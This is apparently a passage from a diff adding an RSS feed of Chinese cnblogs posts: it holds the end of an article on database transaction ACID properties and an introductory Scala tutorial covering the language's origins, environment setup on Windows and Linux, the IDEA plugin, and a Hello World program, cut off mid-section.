+&lt;li&gt;数据库延迟约束，例如数据字段的类型、空值、关系、数据范围、主键唯一性等这些合法性的检查都是由Durability来保证，在事务commit时，发现数据不合法，是无法提交成功的。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;所以，综上所述，一致性C，是数据状态的正确变换的保证，AID，是实现C的手段，也是我们真正要追求的目标。&lt;/p&gt;
+
+&lt;p&gt;而，隔离性I的设定，就是对一致性C不同程度的破坏，事实上，如果我们顺序对数据进行读写，ACD是完全可用保证的，但这样效率会非常的低下，那，我们是要严格的一致性，还是更高的效率，数据库专家们把这个决定权交给了用户，所以，我们看到，ACID当中，只有隔离性I是用户可以选择的，可以自定义的。&lt;br/&gt;隔离性包括 &lt;code&gt;串行读、读已提交、重复读、读未提交&lt;/code&gt; 等几种策略，性能由低到高，让用户在不同的使用场景，选择合适的隔离策略，在一致性和性能之间平衡，取得最好的综合表现。&lt;/p&gt;
+
+&lt;h2&gt;小结&lt;/h2&gt;
+&lt;p&gt;本文主要介绍了事务和事务的几个特性，解释了ACID的由来和之间的关系，&lt;/p&gt;
+&lt;p&gt;总的来说，ACID的核心是C，大家其实都是为得到C而提出的不同纬度的限制和规范，A确定一个功能的完整性，D对状态负责，I可以说是C的等级系数，不同的I的策略，会出现不同的级别的C，AID是数据库本身的功能特性，C由业务层把控，要严格的C，就设置完整的数据库约束和串行隔离，反之，要宽松的C，就放开数据库的约束，使用读未提交的隔离策略，存在即合理，后者更适用于互联网高并发对一致性要求不高的场景，例如分布式的AP系统，可以保证服务整体的响应时间和服务的可用性。&lt;/p&gt;
+
+</description>
+<pubDate>Sat, 23 Mar 2019 01:54:00 +0000</pubDate>
+<dc:creator>土豆的奥特之父</dc:creator>
+<og:description>过去一段时间面试的同学，对于数据库事务，可以按照配置正常使用，但很多都无法讲清楚和理解数据库事务这个东西真正的意义，以及互联网兴起以后，当今数据库在ACID面前面临怎样的问题和抉择。 事务，是各大单机</og:description>
+<dc:language>zh-cn</dc:language>
+<dc:format>text/html</dc:format>
+<dc:identifier>http://www.cnblogs.com/xguo/p/10582648.html</dc:identifier>
+</item>
+<item>
+<title>大数据技术之_16_Scala学习_01_Scala 语言概述 - 黑泽君</title>
+<link>http://www.cnblogs.com/chenmingjun/p/10582571.html</link>
+<guid isPermaLink="true" >http://www.cnblogs.com/chenmingjun/p/10582571.html</guid>
+<description>&lt;p id=&quot;tocid_0&quot; class=&quot;toc&quot;&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10582571.html#hscala&quot;&gt;第一章 Scala 语言概述&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10582571.html#h11whyisscala&quot;&gt;1.1 why is Scala 语言?&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10582571.html#h12scala&quot;&gt;1.2 Scala 语言诞生小故事&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10582571.html#h13scalajavajvm&quot;&gt;1.3 Scala 和 Java 以及 jvm 的关系分析图&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10582571.html#h14scala&quot;&gt;1.4 Scala 语言的特点&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10582571.html#h15windowsscala&quot;&gt;1.5 Windows 下搭建 Scala 开发环境&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10582571.html#h16linuxscala&quot;&gt;1.6 Linux 下搭建 Scala 开发环境&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10582571.html#h17scala&quot;&gt;1.7 Scala 的开发工具&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10582571.html#h171idea&quot;&gt;1.7.1 IDEA介绍&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10582571.html#h172scala&quot;&gt;1.7.2 Scala 插件安装&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10582571.html#h18scala&quot;&gt;1.8 Scala 的开发快速入门&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10582571.html#h181windows&quot;&gt;1.8.1 windows 下开发步骤&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10582571.html#h182linux&quot;&gt;1.8.2 linux 下开发步骤&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10582571.html#h183idea&quot;&gt;1.8.3 IDEA 下开发步骤&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10582571.html#h184javascala&quot;&gt;1.8.4 使用 java 写一段模拟代码，来模拟 scala 的执行流程&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10582571.html#h185scala&quot;&gt;1.8.5 Scala 执行流程分析&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10582571.html#h186scala&quot;&gt;1.8.6 Scala 程序开发注意事项(重点)&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10582571.html#h19scala&quot;&gt;1.9 Scala 语言转义字符&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10582571.html#h110scala&quot;&gt;1.10 Scala 语言输出的三种方式&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10582571.html#h111scala&quot;&gt;1.11 Scala 源码的查看的关联&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10582571.html#h112&quot;&gt;1.12 注释&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10582571.html#h1121&quot;&gt;1.12.1 介绍&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10582571.html#h1122scala&quot;&gt;1.12.2 Scala 中的注释类型&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10582571.html#h1123&quot;&gt;1.12.3 文档注释案例&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10582571.html#h1124scala&quot;&gt;1.12.4 scala 的代码规范说明&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10582571.html#h1125&quot;&gt;1.12.5 正确的注释和注释风格&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10582571.html#h1126&quot;&gt;1.12.6 正确的缩进和空白&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10582571.html#h1127scala&quot;&gt;1.12.7 Scala 官方编程指南&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10582571.html#h113&quot;&gt;1.13 本章知识回顾&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;hr/&gt;&lt;h2 id=&quot;hscala&quot;&gt;&lt;span&gt;&lt;strong&gt;第一章 Scala 语言概述&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;
+&lt;h3 id=&quot;h11whyisscala&quot;&gt;&lt;span&gt;&lt;strong&gt;1.1 why is Scala 语言?&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
+&lt;blockquote readability=&quot;9&quot;&gt;
+&lt;p&gt;1、Spark--新一代&lt;code&gt;内存级&lt;/code&gt;大数据计算框架，是大数据的重要内容。&lt;br/&gt;2、Spark 就是使用 Scala 编写的。因此为了更好的学习 Spark, 需要掌握 Scala 这门语言。&lt;br/&gt;3、Scala 是 Scalable Language 的简写，是一门多范式(范式=编程方式[面向对象/函数式编程])的编程语言。&lt;br/&gt;4、联邦理工学院洛桑（EPFL）的 Martin Odersky(马丁·奥德斯基) 于 2001 年开始设计 Scala(斯卡拉)。&lt;br/&gt;5、Spark 的兴起，带动 Scala 语言的发展！&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&quot;h12scala&quot;&gt;&lt;span&gt;&lt;strong&gt;1.2 Scala 语言诞生小故事&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
+&lt;blockquote readability=&quot;9&quot;&gt;
+&lt;p&gt;  创始人马丁·奥德斯基 (Martin Odersky) 是编译器及编程的狂热爱好者，长时间的编程之后，希望发明一种语言，能够让写程序这样的基础工作变得高效、简单。所以当接触到 JAVA 语言后，对 JAVA 这门便携式、运行在网络、且存在垃圾回收的语言产生了极大的兴趣，所以决定将函数式编程语言的特点融合到 JAVA 中，由此发明了两种语言（Pizza &amp;amp; Scala）。 （大量使用递归）&lt;br/&gt;  jdk5.0 的泛型、for 循环增强,、自动类型转换等，都是从 Pizza 引入的新特性。&lt;br/&gt;  jdk8.0 的类型推断、Lambda 表达式 就是从 scala 引入的特性。&lt;br/&gt;  Pizza 和 Scala 极大地推动了 Java 编程语言的发展。[如何理解?]&lt;br/&gt;  且现在主流 JVM 的 javac 编译器就是 马丁·奥德斯基 编写出来的。并被 JAVA 编程人员广泛的使用，所以 Scala 语言起源于 Java，却推动着 Java 的发展，它们是相辅相成的。Jdk5.0、Jdk8.0 的编译器就是 马丁·奥德斯基 写的，因此 马丁·奥德斯基 是一个人的战斗力抵得上一个 Java 开发团队。&lt;br/&gt;  &lt;/p&gt;
+&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/03/23/AGAQeO.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;  正是基于上面的原因，所以 Scala 源代码 (.scala) 会被编译成 Java 字节码 (.class)，然后运行于 JVM 之上，并可以调用现有的 Java 类库，实现两种语言的无缝对接，因此，对于已经掌握 JAVA 语言的我们来讲，学习起来一定会略显轻松。&lt;br/&gt;  Scala 是一门以 java 虚拟机(JVM) 为目标运行环境并将&lt;code&gt;面向对象&lt;/code&gt;和&lt;code&gt;函数式编程&lt;/code&gt;的最佳特性结合在一起的&lt;code&gt;静态类型编程语言&lt;/code&gt;。（运行之前一定知道类型是什么）
+
+&lt;/blockquote&gt;
+&lt;h3 id=&quot;h13scalajavajvm&quot;&gt;&lt;span&gt;&lt;strong&gt;1.3 Scala 和 Java 以及 jvm 的关系分析图&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
+&lt;blockquote readability=&quot;8&quot;&gt;
+&lt;p&gt;  一般来说，学 Scala 的人，都会 Java，而 Scala 是基于 Java 的，因此我们需要将 Scala 和 Java 以及 JVM 之间的关系搞清楚，否则学习 Scala 你会蒙圈。&lt;br/&gt;  建议：如果没有任何 Java 基础的同学，先学 Java，至少要学习 JavaSE，再学习 Scala。&lt;br/&gt;  我们分析一下：Scala 和 Java 以及 jvm 的关系 (重要！！！)&lt;br/&gt;  &lt;/p&gt;
+&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/03/23/AGAVY9.png&quot; alt=&quot;&quot;/&gt;&lt;/blockquote&gt;
+&lt;h3 id=&quot;h14scala&quot;&gt;&lt;span&gt;&lt;strong&gt;1.4 Scala 语言的特点&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
+&lt;blockquote readability=&quot;9&quot;&gt;
+&lt;p&gt;  Scala 是一门以 java 虚拟机(JVM) 为运行环境并将&lt;code&gt;面向对象&lt;/code&gt;和&lt;code&gt;函数式编程&lt;/code&gt;的最佳特性结合在一起的&lt;code&gt;静态类型编程语言(编译型语言)&lt;/code&gt;。（动态类型语言：javascript、python、php 解释型语言）&lt;br/&gt;  Scala 是一门多范式 (multi-paradigm) 的编程语言，Scala 支持面向对象和函数式编程。&lt;br/&gt;  Scala 源代码 (.scala) 会被编译成 Java 字节码 (.class)，然后运行于 JVM 之上，&lt;code&gt;并可以调用现有的 Java 类库，实现两种语言的无缝对接&lt;/code&gt;。[案例演示]&lt;br/&gt;  scala 单作为一门语言来看，非常的&lt;strong&gt;简洁高效&lt;/strong&gt;。[对 三元运算，++，-- 等进行简化]&lt;br/&gt;  Scala 在设计时，马丁·奥德斯基 是参考了 Java 的设计思想，可以说 Scala 是源于 java，同时 马丁·奥德斯基 也加入了自己的思想，将函数式编程语言的特点融合到 JAVA 中, 因此，对于学习过 Java 的同学，只要在学习 Scala 的过程中，搞清楚 Scala 和 java 相同点和不同点，就可以快速的掌握 Scala 这门语言。&lt;br/&gt;  快速有效掌握 Scala 的建议 [1、学习 scala 特有的语法。2、搞清楚 scala 和 java 区别。 3、如何规范的使用 scala。]&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&quot;h15windowsscala&quot;&gt;&lt;span&gt;&lt;strong&gt;1.5 Windows 下搭建 Scala 开发环境&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;安装&amp;amp;配置&lt;br/&gt;  1、Scala 需要 Java 运行时库，安装 Scala 需要首先安装 JVM 虚拟机并配置好，推荐安装 JDK1.8。&lt;br/&gt;  2、在 http://www.scala-lang.org/ 下载 Scala2.11.8 程序安装包&lt;br/&gt;  3、配置 Jdk 的环境变量&lt;br/&gt;  4、配置 SCALA_HOME，&lt;code&gt;SCALA_HOME= D:\program\scala-2.11.8&lt;/code&gt;&lt;br/&gt;  5、将 Scala 安装目录下的 bin 目录加入到 PATH 环境变量，在 PATH 变量中添加：&lt;code&gt;%SCALA_HOME%\bin&lt;/code&gt;&lt;br/&gt;  6、在终端中输入 “scala” 命令打开 scala 解释器&lt;br/&gt;1、&lt;/p&gt;
+&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/03/23/AGAieU.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;2、&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/03/23/AGA9yV.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;3、&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/03/23/AGACLT.png&quot; alt=&quot;&quot;/&gt;&lt;h3 id=&quot;h16linuxscala&quot;&gt;&lt;span&gt;&lt;strong&gt;1.6 Linux 下搭建 Scala 开发环境&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;  在实际开发中，我们的项目是部署到 linux 上，因此，我们需要在 Linux 下搭建 scala 的环境。Linux 下安装 Scala 的原理机制一样，操作的具体步骤：&lt;br/&gt;1、下载对应的 scala 的安装软件 scala-2.11.8.tgz&lt;br/&gt;2、通过远程登录工具，将安装软件上传到对应的 Linux 系统（xshell6 和 xftp6）&lt;br/&gt;3、mkdir /opt/module/scala 创建目录&lt;br/&gt;4、解压：&lt;code&gt;$ tar -zvxf /opt/software/scala-2.11.8.tgz -C /opt/module/scala/&lt;/code&gt;&lt;br/&gt;5、配置环境变量 vim /etc/profile&lt;br/&gt;在该文件中配置 scala 的 bin 目录 /opt/module/scala/scala-2.11.8/bin&lt;/p&gt;
+&lt;pre&gt;
+&lt;code class=&quot;hljs bash&quot;&gt;&lt;br/&gt;&lt;span class=&quot;hljs-built_in&quot;&gt;export&lt;/span&gt; SCALA_HOME=/opt/module/scala/scala-2.11.8&lt;br/&gt;&lt;span class=&quot;hljs-built_in&quot;&gt;export&lt;/span&gt; PATH=&lt;span class=&quot;hljs-variable&quot;&gt;$PATH&lt;/span&gt;:&lt;span class=&quot;hljs-variable&quot;&gt;$SCALA_HOME&lt;/span&gt;/bin&lt;br/&gt;&lt;/code&gt;
+&lt;/pre&gt;
+&lt;p&gt;6、使配置文件生效 source /etc/profile&lt;br/&gt;7、测试，命令：scala&lt;/p&gt;
+&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/03/23/AGAFwF.png&quot; alt=&quot;&quot;/&gt;&lt;p&gt;Scala 的 REPL：&lt;/p&gt;
+&lt;blockquote readability=&quot;8&quot;&gt;
+&lt;p&gt;  上面打开的 scala 命令行窗口，我们称之为 REPL，是指：Read Evaluation Print Loop，也称之为交互式解释器。类似于 MySQL 的默认客户端工具。在命令行窗口中输入 scala 指令代码时，解释器会读取指令代码并计算（Evaluation）对应的值，然后将结果打印（Print）出来，接着循环等待用户输入指令（Loop）。&lt;br/&gt;  从技术上讲，这里其实并不是一个解释器，而是指令代码被快速的编译成 Java 字节码并被 JVM 加载执行。最终将执行结果输出到命令行中。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&quot;h17scala&quot;&gt;&lt;span&gt;&lt;strong&gt;1.7 Scala 的开发工具&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
+&lt;h4 id=&quot;h171idea&quot;&gt;&lt;span&gt;&lt;strong&gt;1.7.1 IDEA介绍&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
+&lt;blockquote readability=&quot;9&quot;&gt;
+&lt;p&gt;  IDEA 全称 IntelliJ IDEA，是用于 java 语言开发的集成环境（也可用于其他语言），IntelliJ 在业界被公认为最好的 java 开发工具之一。IDEA 是 JetBrains 公司的产品，这家公司总部位于捷克共和国的首都布拉格。&lt;br/&gt;  java 开发工具很多，比如 netbean、eclipse 等等，单开发 Scala 可选的工具不多，主要使用 IDEA。&lt;br/&gt;  Idea 工具开发 Scala 的快捷键也不是很多，所以使用相对比较简单。&lt;br/&gt;  IDEA 不是专门用于开发 Scala 的 IDE，但是确是最适合开发 Scala 的工具，因为在我们实际工作中，大部分是开发项目，而大数据项目不可避免的会使用到 Java, 所以会进行 Java 和 Scala 两种语言的混合编程。 而 Idea 可以很好的支持 Java 和 Scala 的开发。&lt;br/&gt;  IDEA 的安装与配置详解：https://www.cnblogs.com/chenmingjun/p/10290183.html&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h4 id=&quot;h172scala&quot;&gt;&lt;span&gt;&lt;strong&gt;1.7.2 Scala 插件安装&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;  默认情况下 IDEA 不支持 Scala 的开发，需要安装 Scala 插件。&lt;br/&gt;操作的具体步骤：&lt;br/&gt;1、下载插件：scala-intellij-bin-2017.2.6.zip，下载地址：https://plugins.jetbrains.com/plugin/1347-scala，找到对应的版本&lt;br/&gt;2、建议该插件文件放到 scala 的安装目录，我们新建文件夹 /plugin，方便我们管理&lt;br/&gt;3、将插件安装到 idea&lt;br/&gt;4、打开 idea，先找到安装插件的位置 File -&amp;gt; Settings -&amp;gt; Plugins -&amp;gt; Installplugin from disk… -&amp;gt; 选择插件的路径 -&amp;gt; OK -&amp;gt; OK&lt;br/&gt;5、点击 OK，重启 idea&lt;/p&gt;
+&lt;h3 id=&quot;h18scala&quot;&gt;&lt;span&gt;&lt;strong&gt;1.8 Scala 的开发快速入门&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;  需求说明：要求开发一个 Hello.scala 程序，可以输出 “hello world!&quot; [对 scala 程序基本结构说明]。&lt;/p&gt;
+&lt;h4 id=&quot;h181windows&quot;&gt;&lt;span&gt;&lt;strong&gt;1.8.1 windows 下开发步骤&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;步骤如下：&lt;br/&gt;  1、可以直接使用文本开发工具[Sublime Text 3]。&lt;br/&gt;  2、将 Scala 代码编写到扩展名为 HelloScala.scala 的文件中。[ 说明: 比如将源码在目录 D:\demo\ScalaDemo 下 ]&lt;br/&gt;  3、通过 scalac 命令对该 scala 文件进行编译，生成 .class 文件。[和javac类似]&lt;br/&gt;  4、命令行下执行 scala HelloScala 就可以看到运行效果。&lt;br/&gt;  5、&lt;code&gt;注意&lt;/code&gt;：scala HelloScala 命令可以直接运行 HelloScala.scala 程序。[内部会有编译和运行过程]&lt;br/&gt;效果截图：&lt;/p&gt;
+&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/03/23/AGAko4.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;对 scala 程序基本结构说明：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/03/23/AGAZWR.png&quot; alt=&quot;&quot;/&gt;&lt;h4 id=&quot;h182linux&quot;&gt;&lt;span&gt;&lt;strong&gt;1.8.2 linux 下开发步骤&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;步骤如下：&lt;br/&gt;  1、直接使用 vim 开发，一个遍历数组的案例。&lt;br/&gt;  2、将 Scala 代码编写到扩展名为 HelloScala.scala 的文件中。[代码说明]&lt;br/&gt;  3、通过 scala 命令对该 scala 文件进行编译，生成 .class 字节码文件。&lt;br/&gt;  4、在终端执行 scala HelloScala 就可以看到运行效果。&lt;br/&gt;  5、&lt;code&gt;注意&lt;/code&gt;：通过 scala HelloScala 命令可以直接运行 HelloScala.scala 程序。&lt;br/&gt;代码如下：&lt;/p&gt;
+&lt;pre&gt;
+&lt;code class=&quot;scala language-scala&quot;&gt;/**&lt;br/&gt;* 只要以后看到 object HelloScala，我们就应该有如下认识：&lt;br/&gt;*     1、object HelloScala 对应的是一个 HelloScala$ 类型的静态对象 MODULE$。&lt;br/&gt;*     2、object HelloScala 在程序运行中是单例存在的。&lt;br/&gt;*/&lt;br/&gt;object HelloScala {&lt;br/&gt;def main(args: Array[String]): Unit = {&lt;br/&gt;println(&quot;hello scala&quot;)&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;
+&lt;/pre&gt;
+&lt;h4 id=&quot;h183idea&quot;&gt;&lt;span&gt;&lt;strong&gt;1.8.3 IDEA 下开发步骤&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;  使用文本工具开发项目可以很好的理解运行原理，但是不利于开发综合项目，所以在实际开发中我们要使用 Idea 来开发。&lt;br/&gt;步骤如下：&lt;br/&gt;  1、新建一个 Maven 工程，在工程的 main 目录下新建一个 scala 文件夹，将该文件夹标记为【源码文件夹】，方便管理。右键 scala -&amp;gt; Mark Directory as -&amp;gt; Sources Root&lt;br/&gt;  2、默认情况下，不能写 scala 程序，需要我们引入 scala 框架(即将该工程关联上 scala)，选中该项目右键 -&amp;gt; Add Framework Support… -&amp;gt; 勾选左侧 Scala -&amp;gt; 指定 Scala 安装的主目录 -&amp;gt; OK。&lt;br/&gt;  3、在 scala 文件夹上右击，选择新建一个 Scala 类，勾选 Kind 为 Object，如下图所示：&lt;br/&gt;  &lt;/p&gt;
+&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/03/23/AGAuy6.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;  4、开发一个 HelloScala.scala 程序。&lt;br/&gt;  5、运行后，就可以看到输出。&lt;br/&gt;  &lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/03/23/AGAnQx.png&quot; alt=&quot;&quot;/&gt;&lt;h4 id=&quot;h184javascala&quot;&gt;&lt;span&gt;&lt;strong&gt;1.8.4 使用 java 写一段模拟代码，来模拟 scala 的执行流程&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;代码如下：&lt;/p&gt;
+&lt;pre readability=&quot;8.5&quot;&gt;
